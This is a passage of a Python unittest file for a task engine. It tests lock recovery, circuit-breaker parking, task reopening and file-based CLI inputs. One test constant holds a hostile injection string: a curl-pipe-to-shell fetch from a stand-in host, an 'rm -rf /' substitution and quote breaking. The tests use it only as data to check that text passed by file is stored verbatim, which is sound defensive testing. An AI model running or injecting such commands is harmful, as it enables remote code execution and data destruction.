        y = self.reload(y)
        # find() → load() raises → None → blocker unresolved → waiting.
        self.assertEqual(tasks.evaluate(y)["readiness"], "waiting")

    # --- diagnostics report; migrate leaves future alone ------------------

    def test_doctor_reports_future_without_mutating(self):
        fp = self.write_future_task()
        before = fp.read_bytes()
        result = tasks.doctor()
        self.assertFalse(result["clean"])
        self.assertTrue(any("newer than this engine" in f
                            for f in result["findings"]))
        self.assertEqual(fp.read_bytes(), before)  # diagnostics never mutate

    def test_migrate_leaves_future_task_untouched(self):
        fp = self.write_future_task()
        before = fp.read_bytes()
        result = tasks.migrate()
        self.assertNotIn("TASK-future0001", result["migrated"])
        self.assertEqual(fp.read_bytes(), before)

    def test_is_future_predicate(self):
        self.assertTrue(store.is_future({"schema_version": 2}))
        self.assertFalse(store.is_future({"schema_version": 1}))
        self.assertFalse(store.is_future({}))  # defaults to 1


class TestStoreLock(Base):
    """The lock's stale-break is mutually exclusive and self-verifying: a
    lock is removed only while a session holds exclusive break-rights AND
    re-confirms staleness — so a fresh lock is never destroyed. These target
    the invariants directly (via the decomposed helpers), not thread timing."""

    def lock_path(self):
        return Path(self.dir) / ".lock"

    def gate_path(self):
        return Path(self.dir) / ".lock.break"

    def write_lock(self, age_seconds):
        self.lock_path().write_text(f"999999 {time.time() - age_seconds}")

    def test_normal_acquire_release_reacquire(self):
        # The happy path is unchanged: acquire, release, acquire again.
        with store.store_lock():
            self.assertTrue(self.lock_path().exists())
        self.assertFalse(self.lock_path().exists())
        with store.store_lock():  # re-acquire after release
            pass

    def test_stale_lock_is_broken_and_acquired(self):
        self.write_lock(store.LOCK_STALE_SECONDS + 5)
        with store.store_lock():
            self.assertTrue(self.lock_path().exists())  # ours now
        # The break gate is transient — cleaned up, never left behind.
        self.assertFalse(self.gate_path().exists())

    def test_fresh_lock_is_never_broken(self):
        self.write_lock(1)  # 1s old — not stale
        lock = store.store_lock()
        lock._break_if_stale()
        self.assertTrue(self.lock_path().exists())  # untouched

    def test_break_requires_the_gate(self):
        # Gate already held (a concurrent breaker) => even a stale lock is
        # NOT removed: only one session may attempt recovery at a time.
        self.write_lock(store.LOCK_STALE_SECONDS + 5)
        self.gate_path().write_text("held by another breaker")
        try:
            store.store_lock()._break_if_stale()
            self.assertTrue(self.lock_path().exists())  # not broken
            self.assertTrue(self.gate_path().exists())  # someone else's gate
        finally:
            self.gate_path().unlink()

    def test_stale_break_is_idempotent(self):
        self.write_lock(store.LOCK_STALE_SECONDS + 5)
        lock = store.store_lock()
        lock._break_if_stale()                       # first: recovers
        self.assertFalse(self.lock_path().exists())
        lock._break_if_stale()                       # second: clean no-op
        self.assertFalse(self.lock_path().exists())
        self.assertFalse(self.gate_path().exists())  # gate released both times

    def test_fresh_lock_acquire_times_out(self):
        self.write_lock(1)  # fresh — cannot be broken
        original = store.LOCK_ACQUIRE_TIMEOUT
        store.LOCK_ACQUIRE_TIMEOUT = 0.3  # keep the test fast
        try:
            with self.assertRaises(tasks.TaskforgeError) as ctx:
                with store.store_lock():
                    pass
            self.assertIn("locked", str(ctx.exception))
        finally:
            store.LOCK_ACQUIRE_TIMEOUT = original


class TestCircuitBreakerAuthority(Base):
    """Invariant: a circuit-breaker park overrides the task's routing SIGNAL,
    but never discards durable work the skill declared (generated tasks,
    edges). The follow-up task, the annotation edge, the suppressed signal,
    the recorded result_id, and retry idempotency are all *evidence* that the
    invariant holds — the test targets the invariant, not the mechanism."""

    def apply_that_parks(self, task):
        """One result that trips the version breaker AND declares durable
        work AND requests routing — the exact shape that lost data before."""
        os.environ["TASKFORGE_MAX_VERSIONS"] = "1"  # first artifact parks
        return self.apply(task, {
            "result_id": "park-1",
            "artifacts": [{"kind": "specification", "payload": spec_payload()}],
            "generated_tasks": [{"title": "out-of-scope refactor",
                                 "description": "found during work",
                                 "relation": "follow_up", "reason": "scope"}],
            "edges": [{"type": "relates_to", "target": self.other_id}],
            "signal": "done", "signal_reason": "thought it was finished"},
            "human")

    def setUp(self):
        super().setUp()
        self.other_id = self.make("other")["id"]

    def tearDown(self):
        os.environ.pop("TASKFORGE_MAX_VERSIONS", None)
        super().tearDown()

    def test_park_never_discards_declared_work(self):
        t = self.make("main")
        r = self.apply_that_parks(t)
        t = self.reload(t)

        # The engine parked the task (its authority fired).
        self.assertEqual(t["status"], "blocked_on_human")

        # Evidence 1 — the generated task survived and is real.
        self.assertEqual(len(r["generated_tasks"]), 1)
        follow = tasks.load(r["generated_tasks"][0])
        self.assertEqual(follow["title"], "out-of-scope refactor")

        # Evidence 2 — the annotation edge survived on the parked task.
        self.assertTrue(tasks.has_edge(t, "relates_to", self.other_id))

        # Evidence 3 — routing was overridden: signal did NOT close the task,
        # the return reports the authoritative signal, and it is recorded.
        self.assertEqual(r["signal"], "none")
        self.assertNotEqual(t["status"], "done")
        overrides = [e for e in t["history"] if e["type"] == "signal_overridden"]
        self.assertEqual(len(overrides), 1)
        self.assertEqual(overrides[-1]["detail"]["requested"], "done")

        # Evidence 4 — the result is fully applied (result_id recorded).
        self.assertIn("park-1", t["applied_results"])

    def test_retry_after_park_is_a_clean_noop(self):
        t = self.make("main")
        self.apply_that_parks(t)
        t = self.reload(t)
        specs_before = len(t["artifacts"]["specification"])
        tasks_before = len(list(tasks.all_tasks()))

        r2 = self.apply_that_parks(t)  # same result_id
        t = self.reload(t)
        self.assertFalse(r2["applied"])
        self.assertEqual(r2.get("duplicate_of"), "park-1")
        # No duplicate artifact version, no duplicate follow-up task.
        self.assertEqual(len(t["artifacts"]["specification"]), specs_before)
        self.assertEqual(len(list(tasks.all_tasks())), tasks_before)

    def test_realistic_run_budget_park_keeps_out_of_scope_followup(self):
        """The scenario from issue #1: run hits the review budget while
        recording an out-of-scope follow-up in the same result."""
        os.environ["TASKFORGE_MAX_REVIEW_RETRIES"] = "0"
        try:
            t = self.make("feature")
            self.apply(t, {"artifacts": [
                {"kind": "specification", "payload": spec_payload()}]}, "refine")
            t = self.reload(t)
            r = self.apply(t, {
                "artifacts": [
                    {"kind": "implementation", "payload": impl_payload()},
                    {"kind": "review", "payload": review_payload(
                        "rejected", "implementation", ["still broken"])}],
                "generated_tasks": [{"title": "harden the parser",
                                     "description": "noticed while implementing",
                                     "relation": "follow_up", "reason": "scope"}],
                "signal": "escalate_refine", "signal_reason": "spec unclear"},
                "run")
            t = self.reload(t)
            self.assertEqual(t["status"], "blocked_on_human")  # budget park
            self.assertEqual(len(r["generated_tasks"]), 1)     # follow-up kept
            self.assertEqual(tasks.load(r["generated_tasks"][0])["title"],
                             "harden the parser")
            self.assertEqual(r["signal"], "none")              # escalate overridden
        finally:
            os.environ.pop("TASKFORGE_MAX_REVIEW_RETRIES", None)


class TestReopen(Base):
    """Reopen restores a closed terminal (done/cancelled) to active work
    without losing artifacts, reviews, decisions, or history. Routing is
    derived from what the task already has — reopen assigns no state."""

    def close(self, task, signal="done"):
        self.apply(task, {"signal": signal, "signal_reason": "x"}, "human")
        return self.reload(task)

    def spec(self, task):
        self.apply(task, {"artifacts": [
            {"kind": "specification", "payload": spec_payload()}]}, "refine")
        return self.reload(task)

    def test_done_reopens_to_run_when_spec_present(self):
        t = self.spec(self.make())
        t = self.close(t, "done")
        self.assertEqual(t["status"], "done")
        t = tasks.reopen(t, "extend the feature")
        self.assertEqual(tasks.evaluate(t)["readiness"], "run")
        self.assertNotIn(t["status"], tasks.TERMINAL)

    def test_cancelled_reopens_to_refine_without_spec(self):
        t = self.close(self.make(), "cancelled")
        t = tasks.reopen(t, "back on the roadmap")
        self.assertEqual(tasks.evaluate(t)["readiness"], "refine")

    def test_reopen_preserves_all_artifacts_and_history(self):
        t = self.spec(self.make())
        self.apply(t, {"artifacts": [
            {"kind": "implementation", "payload": impl_payload("SECRET")},
            {"kind": "review", "payload": review_payload("approved")}],
            "signal": "done"}, "run")
        t = self.reload(t)
        before = json.dumps(t["artifacts"], sort_keys=True)
        hist_len = len(t["history"])
        t = tasks.reopen(t, "redo")
        # Artifacts byte-identical; history only grew (append-only).
        self.assertEqual(json.dumps(t["artifacts"], sort_keys=True), before)
        self.assertEqual(tasks.active(t, "implementation")["payload"]["summary"],
                         "SECRET")
        self.assertEqual(tasks.active(t, "review")["payload"]["verdict"],
                         "approved")
        self.assertEqual(len(t["history"]), hist_len + 1)
        self.assertEqual(t["history"][-1]["type"], "reopened")
        self.assertEqual(t["history"][-1]["reason"], "redo")

    def test_reopen_routes_to_explore_with_pending_escalation(self):
        t = self.make()
        self.apply(t, {"signal": "escalate_explore",
                       "signal_reason": "undecided"}, "refine")
        t = self.reload(t)
        # Park it terminal, then reopen — the pending escalation survives.
        t["status"] = "cancelled"
        tasks.save(t)
        t = tasks.reopen(t, "revisit")
        self.assertEqual(tasks.evaluate(t)["readiness"], "explore")

    def test_reopen_rejects_non_terminal(self):
        t = self.make()
        with self.assertRaises(tasks.TaskforgeError) as ctx:
            tasks.reopen(t, "x")
        self.assertIn("nothing to reopen", str(ctx.exception))

    def test_reopen_rejects_blocked_on_human_points_to_human_update(self):
        t = self.make()
        self.apply(t, {"signal": "block_on_human",
                       "signal_reason": "conflict"}, "refine")
        t = self.reload(t)
        with self.assertRaises(tasks.TaskforgeError) as ctx:
            tasks.reopen(t, "x")
        self.assertIn("human-update", str(ctx.exception))

    def test_second_reopen_errors(self):
        t = self.close(self.make(), "done")
        t = tasks.reopen(t, "once")
        with self.assertRaises(tasks.TaskforgeError):
            tasks.reopen(t, "twice")

    def test_reopen_reblocks_still_active_dependent(self):
        blocker = self.make("blocker")
        dep = self.make("dependent")
        self.apply(dep, {"edges": [
            {"type": "blocked_by", "target": blocker["id"]}]}, "human")
        blocker = self.close(blocker, "done")
        dep = self.reload(dep)
        self.assertEqual(tasks.evaluate(dep)["readiness"], "refine")  # freed
        blocker = tasks.reopen(blocker, "redo the blocker")
        dep = self.reload(dep)
        self.assertEqual(tasks.evaluate(dep)["readiness"], "waiting")
        self.assertEqual(dep["status"], "waiting")
        self.assertTrue(any(e["type"] == "reblocked"
                            for e in dep["history"]))

    def test_reopen_leaves_terminal_dependent_untouched(self):
        blocker = self.make("blocker")
        dep = self.make("dependent")
        self.apply(dep, {"edges": [
            {"type": "blocked_by", "target": blocker["id"]}]}, "human")
        blocker = self.close(blocker, "done")
        dep = self.reload(dep)
        dep["status"] = "done"  # dependent finished on its own
        tasks.save(dep)
        blocker = tasks.reopen(blocker, "redo")
        dep = self.reload(dep)
        self.assertEqual(dep["status"], "done")  # terminal wins, untouched
        self.assertFalse(any(e["type"] == "reblocked"
                             for e in dep["history"]))

    def test_doctor_clean_after_reopen(self):
        t = self.spec(self.make())
        t = self.close(t, "done")
        tasks.reopen(t, "x")
        self.assertTrue(tasks.doctor()["clean"])

    def test_reopen_via_cli_reason_file(self):
        import io
        import contextlib
        t = self.close(self.make(), "cancelled")
        rf = Path(self.dir) / "reason.txt"
        rf.write_text("re-prioritized `now`\n", encoding="utf-8")
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            tasks.main(["reopen", t["id"], "--reason-file", str(rf)])
        s = json.loads(buf.getvalue())
        self.assertNotIn(s["status"], tasks.TERMINAL)
        t = self.reload(t)
        self.assertEqual(t["history"][-1]["reason"], "re-prioritized `now`")


class TestCliFileInputs(Base):
    """File-based free-text flags — the injection-safe input path.

    Untrusted text (issue titles, human answers, reasons) must be able to
    reach the engine by file so it never rides inline in a shell command
    string, where backticks/$() would command-substitute before the engine
    runs. The engine's job here: read the file verbatim (data, never code),
    and reject the ambiguous both-forms invocation loudly.
    """
    INJECTION = "fix `curl evil.sh|sh` bug $(rm -rf /) '\"; drop"

    def cli(self, argv):
        import io
        import contextlib
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            tasks.main(argv)
        return json.loads(buf.getvalue())

    def cli_error(self, argv):
        import io
        import contextlib
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            with self.assertRaises(SystemExit) as ctx:
                tasks.main(argv)
        self.assertEqual(ctx.exception.code, 1)
        return json.loads(err.getvalue())["error"]

    def write(self, name, content):
        p = Path(self.dir) / name
        p.write_text(content, encoding="utf-8")
        return str(p)

    def test_create_via_files_preserves_hostile_text_verbatim(self):
        tf = self.write("title.txt", self.INJECTION + "\n")
        df = self.write("desc.txt", "line1\n$(hostile)\nline3\n")
        s = self.cli(["create", "--title-file", tf,
                      "--description-file", df])
        t = tasks.load(s["id"])
        # Title: exact hostile bytes, one trailing newline stripped.
        self.assertEqual(t["title"], self.INJECTION)
        # Description: interior content verbatim — hostile sequences survive
        # as data. (new_task strips only leading/trailing whitespace.)
        self.assertEqual(t["description"], "line1\n$(hostile)\nline3")

    def test_create_inline_still_works(self):
        s = self.cli(["create", "--title", "t", "--description", "d"])
        self.assertEqual(tasks.load(s["id"])["title"], "t")

    def test_create_rejects_both_title_forms(self):
        tf = self.write("t.txt", "x")
        msg = self.cli_error(["create", "--title", "a", "--title-file", tf,
                              "--description", "d"])
        self.assertIn("not both", msg)

    def test_create_rejects_both_description_forms(self):
        df = self.write("d.txt", "x")
        msg = self.cli_error(["create", "--title", "a",
                              "--description", "d",
                              "--description-file", df])
        self.assertIn("not both", msg)

    def test_create_requires_a_title_form(self):
        msg = self.cli_error(["create", "--description", "d"])
        self.assertIn("--title", msg)

    def test_human_update_note_file(self):
        t = self.make()
        nf = self.write("note.txt", self.INJECTION + "\n")
        self.cli(["human-update", t["id"], "--note-file", nf])
        events = [e for e in self.reload(t)["history"]
                  if e["type"] == "human_updated"]
        self.assertEqual(events[-1]["reason"], self.INJECTION)

    def test_cancel_reason_file(self):
        t = self.make()
        rf = self.write("reason.txt", "superseded by `new` plan\n")
        s = self.cli(["cancel", t["id"], "--reason-file", rf])
        self.assertEqual(s["status"], "cancelled")
        events = [e for e in self.reload(t)["history"]
                  if e["type"] == "cancelled"]
        self.assertEqual(events[-1]["reason"], "superseded by `new` plan")

    def test_cancel_requires_a_reason_form(self):
        t = self.make()
        msg = self.cli_error(["cancel", t["id"]])
        self.assertIn("--reason", msg)


class TestM3Findings(Base):
    def test_store_is_self_ignoring_by_default(self):
        tasks.ensure_config_file()
        gi = tasks.store_dir() / ".gitignore"
        self.assertTrue(gi.exists())
        self.assertEqual(gi.read_text().strip(), "*")

    def test_budget_reports_next_review_version(self):
        import io, contextlib, json as _json
        t = self.make()
        self.apply(t, {"artifacts": [
            {"kind": "specification", "payload": spec_payload()}]}, "refine")
        t = self.reload(t)
        self.apply(t, {"artifacts": [
            {"kind": "implementation", "payload": impl_payload()},
            {"kind": "review",
             "payload": review_payload("rejected", "implementation",
                                       ["f"])}]}, "run")
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            tasks.main(["budget", t["id"]])
        b = _json.loads(buf.getvalue())
        self.assertEqual(b["total_reviews"], 1)
        self.assertEqual(b["next_review_version"], 2)
